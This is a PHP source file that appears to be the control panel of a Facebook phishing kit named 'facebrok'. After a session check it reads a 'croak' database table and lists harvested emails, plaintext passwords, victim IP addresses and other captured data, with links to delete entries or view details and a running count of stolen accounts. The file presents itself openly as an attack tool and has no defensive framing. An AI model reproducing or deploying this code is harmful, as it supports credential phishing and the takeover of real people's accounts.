<?php
// facebrok 
// panel, Control Panel.
session_start();
error_reporting(0);
if($_SESSION['user']){
include ("config.php");
mysql_connect($DB_SERV,$DB_USER,$DB_PASS)  or die ('Failed Connection: '.mysql_error());
mysql_select_db($DB_NADB)                  or die ('Failed in Databases: '.mysql_error());
$dats=mysql_query ("SELECT * FROM croak" ) or die ('Failed Consult: '.mysql_error());
?>
<!--
 ______
 | ___|
 | |_____________________  ___ _______  __
 |  ______ | ___|  __ | |__| |/ /_ | | / /
 | || |  | | |  | ____| __ | | / | | |/ /
 | || |__| | |__| |___||_| |  /|_| |   |
 |_||____,,|____|_____|____|__|____|_|\_\
        one tool awesome for you.
-->
<title>facebrok - panel</title>
<link rel="shortcut icon" href="facebook.png" />
<link href="minify.css" rel="stylesheet" type="text/css"/>
<link href="login.css " rel="stylesheet" type="text/css"/>
<meta http-equiv="Content-type" content="text/html; charset=utf-8" />
<style type="text/css" media="screen"><!--a:link   {text-decoration:none;}   --></style>
<style>table,th,td{border:1px solid red;text-align: center;font-family: fantasy;}</style>
<?php include ("bar.php"); ?>
<script> 
function abrir(url) { 
open(url,'','top=100,left=100,width=500,height=250') ; 
} 
</script> 
<?php
if(!mysql_num_rows($dats)){

		print '
	<style type="text/css">
	.centrar
	{
		position: absolute;
		top:50%;
		left:50%;
	}
</style>
</head>
<body>
	<div class=\'centrar\'>
		<h1>Empy</h1>
		<h5>it\'s time you start to rock out |m|,</h5>
	</div>
</body>
';
         }else{
echo '<center><table style="margin-top: 20px">';
echo '<td><h5>Action</td><td><h5>Emails</td><td><h5>Passwords</td><center><td><h5>Ip</td><td><h5>Data</td>';
$cont=0;
while($all=mysql_fetch_assoc($dats)) 
{
	$cont++; 
	echo '<tr>';
    echo '<td><a href="delete?id='.$all['id'].'"><img title="Remove" src="delete-big.jpg" heith="20" width="20"></a><a target="_blank" href="javascript:abrir(\'details?id='.$all['id'].'\')"><img title="Details" src="more.png" heith="20" width="20"></a></td><td>'.$all['Email'].'</td><td>'.$all['Password'].'</td><td>'.$all['Ip'].'</td><td>'.$all['Dato'].'</td>'; 
    echo '</tr>';
} 
 echo '</table>';
 echo '<br>';
 echo ''.$cont.' accounts';
               }
?>
<?php } else {header("location:../croak");}

